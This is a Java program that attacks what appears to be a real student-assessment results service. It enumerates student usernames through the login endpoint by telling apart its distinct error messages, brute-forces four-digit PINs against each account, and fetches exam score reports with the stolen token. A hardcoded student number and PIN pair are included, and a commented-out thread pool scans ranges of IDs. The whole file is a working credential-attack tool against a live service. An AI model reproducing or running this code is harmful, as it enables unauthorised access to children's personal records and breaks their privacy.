package com.shenpinyi.other.icas;

import com.jayway.jsonpath.DocumentContext;
import com.jayway.jsonpath.JsonPath;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

import java.io.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Solution implements Runnable {
    public static String findpasswd = "Could not find a matched Student";
    public static String findstudent = "Could not find a matched User";
    public static String findschool = "Could not find a matched School";

    private static HttpClient httpclient = HttpClients.createDefault();
    private static HttpPost httppost = new HttpPost("https://nortibeprod.azurewebsites.net/token");

    private int userPrefix = 0;

    public static void main(String[] args) throws IOException, InterruptedException {
//        int from = 10627148;
//        int to = 10627157;
//        ExecutorService executorService = Executors.newFixedThreadPool(10);
//        for (int i = from; i <= to; i++) {
//            executorService.submit(new Solution(i));
//        }

        getScore("1062715469", "9747");
    }

    public Solution(int userPrefix) {
        this.userPrefix = userPrefix;
    }

    @Override
    public void run() {
        try {
            init();
            String student = findStudent(userPrefix);
            if (student == null) {
                System.out.println("Student cannot be found: " + userPrefix);
            } else {
                System.out.println("Found: " + student);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void init() {
        this.httpclient = HttpClients.createDefault();
        this.httppost = new HttpPost("https://nortibeprod.azurewebsites.net/token");
    }

    public String findStudent(int userPrefix) throws IOException {
        for (int i = 0; i < 100; i++) {
            String username = String.format("%08d%02d", userPrefix, i);
            String result = send(username,
                    "1234",
                    findstudent);
            if (result != null) {
                System.out.println("Found student: " + username);
                String student = findPassword(username);
                return student;
            }
        }
        return null;
    }

    public String findPassword(String username) throws IOException {
        for (int j = 0; j < 10000; j++) {
            String result = send(username,
                    String.format("%04d", j),
                    findpasswd);
            if (result != null) {
                return result;
            }
        }
        return null;
    }

    public static void getScore(String userNumber, String password) throws IOException {
        String result = login(userNumber, password);
        DocumentContext context = JsonPath.parse(result);
        String token = context.read("$.access_token", String.class);
        String name = context.read("$.displayName", String.class);
        System.out.print("token:" + token + ", name:" + name);
        String urlFormat = "https://norti2beprod.azurewebsites.net/api/Student/Report/Summary/2019/2019%%20ICAS%%20-%%20%s/01207203/4/%s/en";
        Arrays.asList("English", "Mathematics", "Writing").forEach(subjectName -> {
            String url = String.format(urlFormat, subjectName, userNumber.substring(0, 8));
            System.out.println(url);
            HttpGet httpGet = new HttpGet(url);
            httpGet.setHeader("Authorization", "Bearer " + token);
            HttpResponse response = null;
            try {
                response = httpclient.execute(httpGet);
                HttpEntity entity = response.getEntity();
                if (entity != null) {
                    InputStream in = entity.getContent();
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    try {
                        String s = "";
                        while ((s = br.readLine()) != null) {
                            System.out.println(s);
                        }
                    } finally {
                        br.close();
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        });

    }

    public static String findSchool(String username) throws IOException {
        for (int j = 0; j < 10000; j++) {
            String result = send(username,
                    String.format("%04d", j),
                    findschool);
            if (result != null) {
                return result;
            }
        }
        return null;
    }


//    private void getSubjectScore(String userNumber, String subjectName, String token) {
//        List<String> subjects = Arrays.asList("English", "Mathematics", "Writing");
//
//        String urlFormat = "https://norti2beprod.azurewebsites.net/api/Student/Report/Summary/2019/2019%20ICAS%20-%20%s/01207203/4/%s/en";
//        String url = String.format(urlFormat, subjectName, userNumber);
//
//        HttpGet httpGet = new HttpGet();
//        httpGet.setHeader("Authorization", token);
//    }
//

    private static String login(String username, String password) throws IOException {
        List<NameValuePair> params = new ArrayList<NameValuePair>(3);
        params.add(new BasicNameValuePair("password", password));
        params.add(new BasicNameValuePair("username", username));
        params.add(new BasicNameValuePair("grant_type", "password"));
        httppost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));

        HttpResponse response = httpclient.execute(httppost);
        HttpEntity entity = response.getEntity();

        if (entity != null) {
            InputStream in = entity.getContent();
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            try {

                String s = "";
                while ((s = br.readLine()) != null) {
                    if (s.contains("displayName")) {
                        return s;
                    }
                }
                return null;
            } finally {
                br.close();
            }
        }
        return null;
    }

    private static String send(String username, String password, String expect) throws IOException {
        List<NameValuePair> params = new ArrayList<NameValuePair>(3);
        params.add(new BasicNameValuePair("password", password));
        params.add(new BasicNameValuePair("username", username));
        params.add(new BasicNameValuePair("grant_type", "password"));
        httppost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));

        HttpResponse response = httpclient.execute(httppost);
        HttpEntity entity = response.getEntity();

        if (entity != null) {
            InputStream in = entity.getContent();
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            StringBuilder sb = new StringBuilder();
            String displayName = "";
            try {

                String s = "";
                while ((s = br.readLine()) != null) {
                    if (s.contains(expect)) {
//                        System.out.println(expect + ":" + username + ", password:" + password);
                        return null;
                    }
                    if (s.contains("displayName")) {
                        displayName = s;
                    }
                    sb.append(s);
                }
//                System.out.println("Found user: " + username + ", password:" + password + ":" + sb.toString());
                return username + ":" + password + ":" + displayName;
            } finally {
                br.close();
            }
        }
        return null;
    }

}